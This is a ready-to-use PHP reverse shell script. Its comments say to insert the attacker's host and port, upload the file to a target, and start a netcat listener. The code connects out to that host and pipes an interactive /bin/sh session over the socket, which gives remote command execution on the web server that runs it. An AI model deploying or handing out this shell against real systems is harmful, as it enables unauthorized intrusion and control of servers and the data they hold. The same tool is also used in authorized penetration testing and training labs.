<?php
// Simple PHP reverse shell.
// Before uploading: replace CHANGE_ME_LHOST and CHANGE_ME_LPORT below,
// or export them and use sed to patch this file quickly:
//   sed -i "s/CHANGE_ME_LHOST/$LHOST/; s/CHANGE_ME_LPORT/$LPORT/" php-reverse-shell.php
// Start your listener FIRST: rlwrap nc -lvnp $LPORT

set_time_limit(0);
$ip = 'CHANGE_ME_LHOST';
$port = CHANGE_ME_LPORT;

$sock = fsockopen($ip, $port);
if (!$sock) {
    exit(1);
}

$descriptors = array(
    0 => array('pipe', 'r'),
    1 => array('pipe', 'w'),
    2 => array('pipe', 'w')
);

$shell = function_exists('proc_open') ? '/bin/sh -i' : null;
if ($shell === null) {
    fwrite($sock, "proc_open() is disabled on this target.\n");
    exit(1);
}

$process = proc_open($shell, $descriptors, $pipes);

if (is_resource($process)) {
    stream_set_blocking($pipes[0], false);
    stream_set_blocking($pipes[1], false);
    stream_set_blocking($pipes[2], false);
    stream_set_blocking($sock, false);

    while (true) {
        if (feof($sock) || feof($pipes[1])) {
            break;
        }
        $read = array($sock, $pipes[1], $pipes[2]);
        $write = null;
        $except = null;
        stream_select($read, $write, $except, 1);

        if (in_array($sock, $read)) {
            $input = fread($sock, 4096);
            if ($input !== false && strlen($input) > 0) {
                fwrite($pipes[0], $input);
            }
        }
        if (in_array($pipes[1], $read)) {
            $output = fread($pipes[1], 4096);
            if ($output !== false && strlen($output) > 0) {
                fwrite($sock, $output);
            }
        }
        if (in_array($pipes[2], $read)) {
            $error = fread($pipes[2], 4096);
            if ($error !== false && strlen($error) > 0) {
                fwrite($sock, $error);
            }
        }
    }
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}
fclose($sock);
